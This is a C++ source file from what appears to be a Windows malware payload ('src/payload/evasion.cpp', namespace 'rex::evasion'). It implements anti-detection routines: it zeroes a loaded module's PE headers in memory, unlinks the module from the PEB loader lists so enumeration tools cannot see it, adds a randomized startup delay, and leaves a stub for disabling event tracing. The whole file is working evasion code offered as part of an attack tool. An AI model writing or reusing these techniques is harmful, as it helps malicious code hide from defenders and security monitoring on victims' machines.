// src/payload/evasion.cpp
// C++20 | Windows 11 | MSVC
#include "evasion.hpp"
#include <windows.h>
#include <winternl.h>

// We define the incomplete parts ourselves (winternl.h is deliberately incomplete)
namespace {

struct MY_PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    HANDLE     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
};

struct MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    // remaining fields not needed
};

struct MY_PEB {
    BOOLEAN                      InheritedAddressSpace;
    BOOLEAN                      ReadImageFileExecOptions;
    BOOLEAN                      BeingDebugged;
    BOOLEAN                      Spare;
    HANDLE                       Mutant;
    PVOID                        ImageBaseAddress;
    MY_PEB_LDR_DATA*             Ldr;
    // rest not needed
};

} // anonymous namespace

namespace rex::evasion {

void wipe_headers(HMODULE base) {
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
    auto nt  = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(base) + dos->e_lfanew);

    DWORD old = 0;
    SIZE_T size = nt->OptionalHeader.SizeOfHeaders;
    if (VirtualProtect(base, size, PAGE_READWRITE, &old)) {
        SecureZeroMemory(base, size);
        VirtualProtect(base, size, old, &old);
    }
}

void unlink_module(HMODULE base) {
#ifdef _WIN64
    auto peb = reinterpret_cast<MY_PEB*>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<MY_PEB*>(__readfsdword(0x30));
#endif
    if (!peb || !peb->Ldr) return;

    auto ldr = peb->Ldr;

    auto unlink_entry = [](LIST_ENTRY* entry) {
        if (entry->Flink && entry->Blink) {
            entry->Blink->Flink = entry->Flink;
            entry->Flink->Blink = entry->Blink;
            entry->Flink = entry;
            entry->Blink = entry;
        }
    };

    for (LIST_ENTRY* entry = ldr->InLoadOrderModuleList.Flink;
         entry != &ldr->InLoadOrderModuleList;
         entry = entry->Flink)
    {
        auto mod = CONTAINING_RECORD(entry, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (mod->DllBase == base) {
            unlink_entry(&mod->InLoadOrderLinks);
            unlink_entry(&mod->InMemoryOrderLinks);
            unlink_entry(&mod->InInitializationOrderLinks);
            break;
        }
    }
}

void disable_etw() {
    // left empty for now
}

void delayed_init(void (*fn)()) {
    Sleep(300 + (GetTickCount() % 900));
    fn();
}

} // namespace rex::evasion
